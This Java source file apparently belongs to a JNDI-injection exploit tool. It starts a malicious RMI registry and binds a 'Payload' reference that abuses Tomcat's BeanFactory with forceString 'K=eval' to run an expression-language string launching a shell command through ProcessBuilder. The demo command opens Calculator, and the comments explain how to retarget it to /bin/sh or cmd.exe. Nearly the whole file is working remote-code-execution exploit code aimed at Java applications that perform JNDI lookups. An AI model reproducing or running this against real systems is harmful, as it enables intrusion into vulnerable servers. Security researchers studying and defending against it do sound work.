package cc.l1k3beef;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Hello world!
 */
public class RMIServer {
    public static void start(int rmiPort, String httpHost, int httpPort, String method) {
        try {
            System.out.println("Creating RMI Registry, RMI Port:" + rmiPort);
            Registry registry = LocateRegistry.createRegistry(rmiPort);

            if (method.equalsIgnoreCase("tomcat")) {
                BypassWithTomcat(registry);
            } else if (method.equalsIgnoreCase("")) {
                // TODO: remote factory
                String codeBaseUrl = "http://" + httpHost + ":" + httpPort + "/";
                System.out.println("HTTP URL CodeBase: " + codeBaseUrl);
            }
        } catch (Exception e) {
            throw new RuntimeException(e.toString());
        }
    }

    public static void BypassWithTomcat(Registry registry) throws AlreadyBoundException, RemoteException, NamingException {
        /** Payload2: Exploit with JNDI Reference with local factory Class **/
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "K=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("K", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/System/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
        /** Payload2 end **/
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Payload", referenceWrapper);
        System.out.println(referenceWrapper.getReference());
    }

    public static void main(String[] args) {
        int rmiPort = Integer.parseInt(args[0]);
        String httpHost = args[1];
        int httpPort = Integer.parseInt(args[2]);
        String method = args[3];
        CodeBaseServer.start(httpHost, httpPort);
        RMIServer.start(rmiPort, httpHost, httpPort, method);
    }
}
